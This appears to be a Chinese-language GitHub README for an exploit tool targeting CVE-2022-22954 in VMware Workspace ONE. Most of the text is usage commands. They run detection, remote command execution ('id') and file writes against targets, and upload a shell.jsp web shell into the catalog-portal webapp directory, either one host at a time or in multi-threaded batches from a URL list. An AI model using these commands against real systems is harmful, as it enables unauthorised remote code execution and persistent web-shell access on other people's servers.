![CVE-2022-22954](https://socialify.git.ci/bewhale/CVE-2022-22954/image?description=1&font=Inter&forks=1&issues=1&language=1&owner=1&pattern=Solid&stargazers=1&theme=Light)




多个漏洞触发点检测，多线程批量检测，命令执行，文件写入

```
// 单个目标漏洞检测
python CVE-2022-22954.py -u https://x.x.x.x

// 命令执行
python CVE-2022-22954.py -u https://x.x.x.x -c "id"

// 写文件
python CVE-2022-22954.py -u https://x.x.x.x -fn test.jsp  -fc "test"

// 上传文件，windows 设置文件名需要指定路径
python CVE-2022-22954.py -u https://x.x.x.x -fn test.jsp  -fp "D:\Desktop\shell.jsp"

// 上传到指定路径
python CVE-2022-22954.py -u https://x.x.x.x -fn "/opt/vmware/horizon/workspace/webapps/catalog-portal/test.jsp"  -fp "D:\Desktop\shell.jsp"

// 批量检测，用法一致
python CVE-2022-22954.py -f url.txt
python CVE-2022-22954.py -f url.txt -c "id" -t 200
python CVE-2022-22954.py -f url.txt -fn test.jsp  -fc "test" -t 200
python CVE-2022-22954.py -f url.txt -fn test.jsp  -fp "D:\Desktop\shell.jsp" -t 200
python CVE-2022-22954.py -f url.txt -fn "/opt/vmware/horizon/workspace/webapps/catalog-portal/test.jsp"  -fp "D:\Desktop\shell.jsp" -t 200
```

![](https://raw.githubusercontent.com/bewhale/CVE-2022-22954/main/1.png)

# 参考文章
https://mp.weixin.qq.com/s/2qHhPs1HcEXVQb7bkC3mcA
